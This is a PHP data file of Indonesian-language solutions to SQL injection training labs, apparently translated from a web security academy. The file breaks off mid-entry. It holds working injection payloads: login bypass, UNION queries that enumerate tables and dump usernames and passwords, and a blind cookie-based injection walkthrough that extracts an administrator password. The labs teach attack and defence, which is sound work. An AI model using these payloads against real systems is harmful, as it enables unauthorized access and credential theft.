<?php

return [
    'd9a071d8264e85184722707ff5747bbbd77963967d1d01f1b22f5dd8252f9767' => [
        'title' => 'Kerentanan SQL injection pada klausa WHERE yang memungkinkan pengambilan data tersembunyi',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Ketika pengguna memilih kategori, aplikasi menjalankan query SQL seperti berikut:
        </p><code class="code-scrollable">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code><p>
            Untuk menyelesaikan lab ini, lakukan serangan SQL injection agar aplikasi menampilkan satu atau lebih produk yang belum dirilis.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        Ubah parameter <code>category</code> menjadi bernilai <code>'+OR+1=1--</code>
                    </li>
                    <li>
                        Kirim permintaan, lalu pastikan respons kini menampilkan satu atau lebih produk yang belum dirilis.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'befc0f5ddbc0e32a7adc4c9d4d286582f462f70bf32a8d5df15489d679dcd5c9' => [
        'title' => 'Kerentanan SQL injection yang memungkinkan bypass login',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada fungsi login.
        </p><p>
            Untuk menyelesaikan lab ini, lakukan serangan SQL injection agar dapat masuk ke aplikasi sebagai pengguna <code>administrator</code>.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan login.
                    </li>
                    <li>
                        Ubah parameter <code>username</code> menjadi bernilai: <code>administrator'--</code>
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '974bd9df06352f8b59c679f854a5bc7e3db6c7fb83f72db653509252a6d47e28' => [
        'title' => 'Serangan SQL injection, memeriksa tipe dan versi database pada Oracle',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Anda dapat menggunakan serangan UNION untuk mengambil hasil dari query yang disuntikkan.
        </p><p>
            Untuk menyelesaikan lab ini, tampilkan string versi database.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Pada database Oracle, setiap pernyataan <code>SELECT</code> wajib menentukan tabel pada klausa <code>FROM</code>. Jika serangan <code>UNION SELECT</code> Anda tidak mengambil data dari tabel mana pun, Anda tetap harus menyertakan kata kunci <code>FROM</code> diikuti nama tabel yang valid.
                </p>
                <p>
                    Oracle menyediakan tabel bawaan bernama <code>dual</code> yang dapat digunakan untuk tujuan ini. Contoh: <code>UNION SELECT 'abc' FROM dual</code>
                </p>
                <p>
                    Untuk informasi lebih lanjut, lihat <a chunk-keep-link="" href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Pada database Oracle, setiap pernyataan <code>SELECT</code> wajib menentukan tabel pada klausa <code>FROM</code>. Jika serangan <code>UNION SELECT</code> Anda tidak mengambil data dari tabel mana pun, Anda tetap harus menyertakan kata kunci <code>FROM</code> diikuti nama tabel yang valid.
                </p>
                <p>
                    Oracle menyediakan tabel bawaan bernama <code>dual</code> yang dapat digunakan untuk tujuan ini. Contoh: <code>UNION SELECT 'abc' FROM dual</code>
                </p>
                <p>
                    Untuk informasi lebih lanjut, lihat <a chunk-keep-link="" href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        <p>
                            Tentukan <a href="/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">jumlah kolom yang dikembalikan oleh query</a> dan <a href="/web-security/sql-injection/union-attacks/lab-find-column-containing-text">kolom mana yang berisi data teks</a>. Pastikan query mengembalikan dua kolom yang keduanya berisi teks dengan payload seperti berikut pada parameter <code>category</code>:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'+FROM+dual--</code>
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut untuk menampilkan versi database:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</code>
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '13e48d1949abb8793e11da34ed06a5811ea3a9b2be0501a5e9f0deb255d37406' => [
        'title' => 'Serangan SQL injection, memeriksa tipe dan versi database pada MySQL dan Microsoft',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Anda dapat menggunakan serangan UNION untuk mengambil hasil dari query yang disuntikkan.
        </p><p>
            Untuk menyelesaikan lab ini, tampilkan string versi database.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        <p>
                            Tentukan <a href="/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">jumlah kolom yang dikembalikan oleh query</a> dan <a href="/web-security/sql-injection/union-attacks/lab-find-column-containing-text">kolom mana yang berisi data teks</a>. Pastikan query mengembalikan dua kolom yang keduanya berisi teks dengan payload seperti berikut pada parameter <code>category</code>:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'#</code>
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut untuk menampilkan versi database:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+@@version,+NULL#</code>
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '81986add1fa6ec438867539cc2f562f01dcf9faf6a0b82766269c3dbeef30b00' => [
        'title' => 'Serangan SQL injection, mendaftar isi database pada database non-Oracle',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Hasil query dikembalikan pada respons aplikasi sehingga Anda dapat menggunakan serangan UNION untuk mengambil data dari tabel lain.
        </p><p>
            Aplikasi ini memiliki fungsi login, dan database menyimpan sebuah tabel yang berisi username dan password. Anda harus menemukan nama tabel beserta kolom-kolomnya, lalu mengambil isi tabel tersebut untuk mendapatkan username dan password semua pengguna.
        </p><p>
            Untuk menyelesaikan lab ini, masuk sebagai pengguna <code>administrator</code>.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        <p>
                            Tentukan <a href="/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">jumlah kolom yang dikembalikan oleh query</a> dan <a href="/web-security/sql-injection/union-attacks/lab-find-column-containing-text">kolom mana yang berisi data teks</a>. Pastikan query mengembalikan dua kolom bertipe teks menggunakan payload seperti berikut pada parameter <code>category</code>:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'--</code>
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut untuk mengambil daftar tabel dalam database:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code>
                    </li>
                    <li>
                        Temukan nama tabel yang menyimpan kredensial pengguna.
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut (ganti nama tabelnya) untuk mengambil rincian kolom dalam tabel tersebut:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code>
                    </li>
                    <li>
                        Temukan nama kolom yang menyimpan username dan password.
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut (ganti nama tabel dan kolomnya) untuk mengambil username dan password semua pengguna:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</code>
                    </li>
                    <li>
                        Temukan password pengguna <code>administrator</code>, lalu gunakan untuk login.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'de4256d42cc604a2a3f7e792c5fff88df1712f1537cd506ed2537efedbd4c665' => [
        'title' => 'Serangan SQL injection, mendaftar isi database pada Oracle',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Hasil query dikembalikan pada respons aplikasi sehingga Anda dapat menggunakan serangan UNION untuk mengambil data dari tabel lain.
        </p><p>
            Aplikasi ini memiliki fungsi login, dan database menyimpan sebuah tabel yang berisi username dan password. Anda harus menemukan nama tabel beserta kolom-kolomnya, lalu mengambil isi tabel tersebut untuk mendapatkan username dan password semua pengguna.
        </p><p>
            Untuk menyelesaikan lab ini, masuk sebagai pengguna <code>administrator</code>.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Pada database Oracle, setiap pernyataan <code>SELECT</code> wajib menentukan tabel pada klausa <code>FROM</code>. Jika serangan <code>UNION SELECT</code> Anda tidak mengambil data dari tabel mana pun, Anda tetap harus menyertakan kata kunci <code>FROM</code> diikuti nama tabel yang valid.
                </p>
                <p>
                    Oracle menyediakan tabel bawaan bernama <code>dual</code> yang dapat digunakan untuk tujuan ini. Contoh: <code>UNION SELECT 'abc' FROM dual</code>
                </p>
                <p>
                    Untuk informasi lebih lanjut, lihat <a chunk-keep-link="" href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Pada database Oracle, setiap pernyataan <code>SELECT</code> wajib menentukan tabel pada klausa <code>FROM</code>. Jika serangan <code>UNION SELECT</code> Anda tidak mengambil data dari tabel mana pun, Anda tetap harus menyertakan kata kunci <code>FROM</code> diikuti nama tabel yang valid.
                </p>
                <p>
                    Oracle menyediakan tabel bawaan bernama <code>dual</code> yang dapat digunakan untuk tujuan ini. Contoh: <code>UNION SELECT 'abc' FROM dual</code>
                </p>
                <p>
                    Untuk informasi lebih lanjut, lihat <a chunk-keep-link="" href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        <p>
                            Tentukan <a href="/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">jumlah kolom yang dikembalikan oleh query</a> dan <a href="/web-security/sql-injection/union-attacks/lab-find-column-containing-text">kolom mana yang berisi data teks</a>. Pastikan query mengembalikan dua kolom bertipe teks menggunakan payload seperti berikut pada parameter <code>category</code>:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'+FROM+dual--</code>
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut untuk mengambil daftar tabel dalam database:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+table_name,NULL+FROM+all_tables--</code>
                    </li>
                    <li>
                        Temukan nama tabel yang menyimpan kredensial pengguna.
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut (ganti nama tabelnya) untuk mengambil rincian kolom dalam tabel tersebut:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--</code>
                    </li>
                    <li>
                        Temukan nama kolom yang menyimpan username dan password.
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut (ganti nama tabel dan kolomnya) untuk mengambil username dan password semua pengguna:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--</code>
                    </li>
                    <li>
                        Temukan password pengguna <code>administrator</code>, lalu gunakan untuk login.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'c0cf223d86b3189ea471d7a4dfe43987f9306dcd549be77599964da1b517b307' => [
        'title' => 'Serangan SQL injection UNION, menentukan jumlah kolom yang dikembalikan oleh query',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Hasil query dikembalikan dalam respons aplikasi sehingga Anda dapat menggunakan serangan UNION untuk mengambil data dari tabel lain. Langkah pertama serangan ini adalah menentukan jumlah kolom yang dikembalikan query. Teknik ini akan Anda pakai pada lab berikutnya untuk menyusun serangan lengkap.
        </p><p>
            Untuk menyelesaikan lab ini, tentukan jumlah kolom yang dikembalikan query dengan melakukan serangan SQL injection UNION yang menambahkan satu baris berisi nilai null.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        Ubah parameter <code>category</code> menjadi bernilai <code>'+UNION+SELECT+NULL--</code>. Perhatikan bahwa terjadi error.
                    </li>
                    <li>
                        <p>
                            Ubah parameter <code>category</code> untuk menambahkan satu kolom lagi berisi nilai null:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+NULL,NULL--</code>
                    </li>
                    <li>
                        Terus tambahkan nilai null hingga error menghilang dan respons menyertakan konten tambahan berisi nilai null tersebut.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'dc3ff4b519f1a96f0bd7507a607ced9ca7f87900eb196d0a9b25001de1833f5e' => [
        'title' => 'Serangan SQL injection UNION, menemukan kolom yang berisi teks',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Hasil query dikembalikan dalam respons aplikasi sehingga Anda dapat menggunakan serangan UNION untuk mengambil data dari tabel lain. Untuk menyusun serangan tersebut, pertama Anda harus menentukan jumlah kolom yang dikembalikan query menggunakan teknik dari <a href="/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">lab sebelumnya</a>. Langkah selanjutnya adalah mengidentifikasi kolom yang kompatibel dengan data string.
        </p><p>
            Lab akan memberikan nilai acak yang harus Anda tampilkan pada hasil query. Untuk menyelesaikan lab ini, lakukan serangan SQL injection UNION yang mengembalikan satu baris tambahan berisi nilai tersebut. Teknik ini membantu Anda mengetahui kolom mana yang kompatibel dengan data string.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        <p>
                            Tentukan <a href="/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">jumlah kolom yang dikembalikan query</a>. Pastikan query mengembalikan tiga kolom menggunakan payload berikut pada parameter <code>category</code>:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+NULL,NULL,NULL--</code>
                    </li>
                    <li>
                        <p>
                            Coba ganti masing-masing null dengan nilai acak yang disediakan oleh lab, misalnya:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abcdef',NULL,NULL--</code>
                    </li>
                    <li>
                        Jika terjadi error, pindah ke null berikutnya dan uji posisi tersebut.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'c94c990a42d1b1f39e53806b1d0d1ad51a43e1f2d5ec1a602c144d7817d3e91c' => [
        'title' => 'Serangan SQL injection UNION, mengambil data dari tabel lain',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Hasil query dikembalikan dalam respons aplikasi sehingga Anda dapat menggunakan serangan UNION untuk mengambil data dari tabel lain. Untuk menyusun serangan ini, Anda perlu menggabungkan teknik yang dipelajari pada lab sebelumnya.
        </p><p>
            Database berisi tabel lain bernama <code>users</code> dengan kolom <code>username</code> dan <code>password</code>.
        </p><p>
            Untuk menyelesaikan lab ini, lakukan serangan SQL injection UNION yang mengambil seluruh username dan password, lalu gunakan informasi tersebut untuk masuk sebagai pengguna <code>administrator</code>.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        <p>
                            Tentukan <a href="/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">jumlah kolom yang dikembalikan oleh query</a> dan <a href="/web-security/sql-injection/union-attacks/lab-find-column-containing-text">kolom mana yang berisi data teks</a>. Pastikan query mengembalikan dua kolom yang keduanya berisi teks dengan payload seperti berikut pada parameter category:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'--</code>
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut untuk mengambil isi tabel <code>users</code>:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+username,+password+FROM+users--</code>
                    </li>
                    <li>
                        Pastikan respons aplikasi menampilkan daftar username dan password.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '7c96fa50c7c53c9f9c96467a8b9e76f070dafcf9bfdcc4f04fc786ef0b0819d2' => [
        'title' => 'Serangan SQL injection UNION, mengambil beberapa nilai dalam satu kolom',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada filter kategori produk. Hasil query dikembalikan dalam respons aplikasi sehingga Anda dapat menggunakan serangan UNION untuk mengambil data dari tabel lain.
        </p><p>
            Database berisi tabel lain bernama <code>users</code> dengan kolom <code>username</code> dan <code>password</code>.
        </p><p>
            Untuk menyelesaikan lab ini, lakukan serangan SQL injection UNION yang mengambil seluruh username dan password, lalu gunakan informasi tersebut untuk masuk sebagai pengguna <code>administrator</code>.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang mengatur filter kategori produk.
                    </li>
                    <li>
                        <p>
                            Tentukan <a href="/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">jumlah kolom yang dikembalikan oleh query</a> dan <a href="/web-security/sql-injection/union-attacks/lab-find-column-containing-text">kolom mana yang berisi data teks</a>. Pastikan query mengembalikan dua kolom dengan hanya satu kolom bertipe teks menggunakan payload seperti berikut pada parameter <code>category</code>:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+NULL,'abc'--</code>
                    </li>
                    <li>
                        <p>
                            Gunakan payload berikut untuk mengambil isi tabel <code>users</code>:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+NULL,username||'~'||password+FROM+users--</code>
                    </li>
                    <li>
                        Pastikan respons aplikasi menampilkan daftar username dan password.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '5aeeac77d52d55cdff3f9a5d86d050c9a77ebfef7657cccb459bee29ad5c3fce' => [
        'title' => 'Blind SQL injection dengan respons kondisional',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind SQL injection. Aplikasi memakai cookie pelacak untuk analitik dan menjalankan query SQL yang berisi nilai cookie yang dikirimkan.
        </p><p>
            Hasil query SQL tidak dikembalikan, dan pesan error tidak ditampilkan. Namun aplikasi menampilkan pesan <code>Welcome back</code> pada halaman jika query mengembalikan baris data apa pun.
        </p><p>
            Database berisi tabel lain bernama <code>users</code> dengan kolom <code>username</code> dan <code>password</code>. Anda harus mengeksploitasi kerentanan blind SQL injection untuk mencari password pengguna <code>administrator</code>.
        </p><p>
            Untuk menyelesaikan lab ini, masuk sebagai pengguna <code>administrator</code>.
        </p><div class="component-solution expandable-container">


        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda dapat berasumsi bahwa password hanya terdiri dari huruf kecil dan karakter alfanumerik.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda dapat berasumsi bahwa password hanya terdiri dari huruf kecil dan karakter alfanumerik.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Buka halaman depan toko, lalu gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang membawa cookie <code>TrackingId</code>. Sebagai contoh sederhana, anggap nilai asli cookie adalah <code>TrackingId=xyz</code>.
                    </li>
                    <li>
                        <p>
                            Ubah cookie <code>TrackingId</code> menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND '1'='1</code>
                        <p>
                            Pastikan pesan <code>Welcome back</code> muncul pada respons.
                        </p>
                    </li>
                    <li>
                        <p>
                            Sekarang ubah menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND '1'='2</code>
                        <p>
                            Pastikan pesan <code>Welcome back</code> tidak muncul pada respons. Ini menunjukkan bagaimana Anda dapat menguji satu kondisi boolean dan menyimpulkan hasilnya.
                        </p>
                    </li>
                    <li>
                        <p>
                            Sekarang ubah menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</code>
                        <p>
                            Pastikan kondisi bernilai benar, yang membuktikan keberadaan tabel <code>users</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            Sekarang ubah menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code>
                        <p>
                            Pastikan kondisi bernilai benar, yang membuktikan adanya pengguna bernama <code>administrator</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            Langkah berikutnya adalah menentukan jumlah karakter password pengguna <code>administrator</code>. Ubah nilainya menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a</code>
                        <p>
                            Kondisi ini seharusnya benar, memastikan panjang password lebih dari 1 karakter.
                        </p>
                    </li>
                    <li>
                        <p>
                            Kirim serangkaian nilai lanjutan untuk menguji panjang password yang berbeda. Kirim:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;2)='a</code>
                        <p>
                            Lalu kirim:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a</code>
                        <p>
                            Dan seterusnya. Anda dapat melakukannya secara manual menggunakan <a href="/burp/documentation/desktop/tools/repeater">Burp Repeater</a> karena panjangnya cenderung singkat. Ketika kondisi berhenti bernilai benar (saat pesan <code>Welcome back</code> menghilang), Anda telah menemukan panjang password, yaitu 20 karakter.
                        </p>
                    </li>
                    <li>
                        Setelah menentukan panjang password, langkah selanjutnya adalah menguji karakter di setiap posisi untuk menemukan nilainya. Proses ini memerlukan jauh lebih banyak permintaan sehingga Anda perlu memakai <a href="/burp/documentation/desktop/tools/intruder">Burp Intruder</a>. Kirim permintaan yang sedang diuji ke Burp Intruder melalui menu konteks.
                    </li>
                    <li>
                        <p>
                            Di Burp Intruder, ubah nilai cookie menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code>
                        <p>
                            Query ini memakai fungsi <code>SUBSTRING()</code> untuk mengekstrak satu karakter password dan mengujinya terhadap nilai tertentu. Serangan akan mengulang setiap posisi dan kemungkinan nilai satu per satu.
                        </p>
                    </li>
                    <li>
                        <p>
                            Pasang penanda posisi payload di sekitar karakter terakhir <code>a</code> pada nilai cookie. Pilih karakter <code>a</code> saja lalu klik tombol <strong>Add §</strong>. Nilai cookie Anda akan tampak seperti berikut:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</code>
                    </li>
                    <li>
                        Untuk menguji karakter di tiap posisi, kirimkan daftar payload yang sesuai pada posisi payload tersebut. Anda dapat berasumsi password hanya berisi huruf kecil dan angka. Di panel samping <strong>Payloads</strong>, pastikan <strong>Simple list</strong> dipilih, dan di bawah <strong>Payload configuration</strong> tambahkan payload rentang a - z dan 0 - 9. Anda bisa memilihnya dengan cepat lewat drop-down <strong>Add from list</strong>.
                    </li>
                    <li>
                        Agar bisa membedakan saat karakter yang tepat terkirim, gunakan grep pada setiap respons untuk ekspresi <code>Welcome back</code>. Klik tab <strong><span class="icon-settings"></span> Settings</strong> untuk membuka panel samping <strong>Settings</strong>. Di bagian <strong>Grep - Match</strong>, hapus entri yang ada lalu tambahkan nilai <code>Welcome back</code>.
                    </li>
                    <li>
                        Jalankan serangan dengan mengeklik tombol <strong><span class="icon-play-circle-outline"></span> Start attack</strong>.
                    </li>
                    <li>
                        Periksa hasil serangan untuk menemukan karakter pada posisi pertama. Anda akan melihat kolom bernama <code>Welcome back</code>. Salah satu baris memiliki tanda centang di kolom tersebut. Payload pada baris itulah karakter posisi pertama.
                    </li>
                    <li>
                        <p>
                        Sekarang cukup jalankan ulang serangan untuk posisi karakter lainnya guna mengetahui nilainya. Kembali ke tab <strong>Intruder</strong>, ubah offset dari 1 menjadi 2 sehingga nilai cookie tampak seperti ini:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a</code>
                    </li>
                    <li>
                        Jalankan serangan yang sudah diubah, periksa hasilnya, lalu catat karakter pada offset kedua.
                    </li>
                    <li>
                        Ulangi proses ini dengan menguji offset 3, 4, dan seterusnya hingga memperoleh seluruh password.
                    </li>
                    <li>
                        Di browser, klik <strong>My account</strong> untuk membuka halaman login. Gunakan password tersebut untuk masuk sebagai pengguna <code>administrator</code>.
                    </li>
                </ol>
                <div class="highlightedarea">
                    <h4>Catatan</h4>
                    <p>
                        Bagi pengguna tingkat lanjut, solusi ini dapat dibuat lebih efisien dengan berbagai cara. Sebagai contoh, alih-alih mencoba setiap karakter satu per satu, Anda dapat melakukan pencarian biner atas ruang karakter, atau membuat satu serangan Intruder dengan dua posisi payload bertipe cluster bomb untuk menguji seluruh permutasi offset dan karakter sekaligus.
                    </p>
                </div>
            </div></div>
LABHTML,
        ],
    ],
    '9622f310ce0fc2a85821811f98f2be7b23e049667d49d018ca28f06dc0b7875a' => [
        'title' => 'Blind SQL injection dengan error kondisional',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind SQL injection. Aplikasi memakai cookie pelacak untuk analitik dan menjalankan query SQL yang berisi nilai cookie yang dikirimkan.
        </p><p>
            Hasil query SQL tidak dikembalikan, dan aplikasi tidak merespons secara berbeda apakah query mengembalikan baris atau tidak. Namun jika query SQL memicu error, aplikasi menampilkan pesan error khusus.
        </p><p>
            Database berisi tabel lain bernama <code>users</code> dengan kolom <code>username</code> dan <code>password</code>. Anda harus mengeksploitasi kerentanan blind SQL injection untuk mengetahui password pengguna <code>administrator</code>.
        </p><p>
            Untuk menyelesaikan lab ini, masuk sebagai pengguna <code>administrator</code>.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Lab ini menggunakan database Oracle. Untuk informasi lebih lanjut, lihat <a chunk-keep-link="" href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Lab ini menggunakan database Oracle. Untuk informasi lebih lanjut, lihat <a chunk-keep-link="" href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
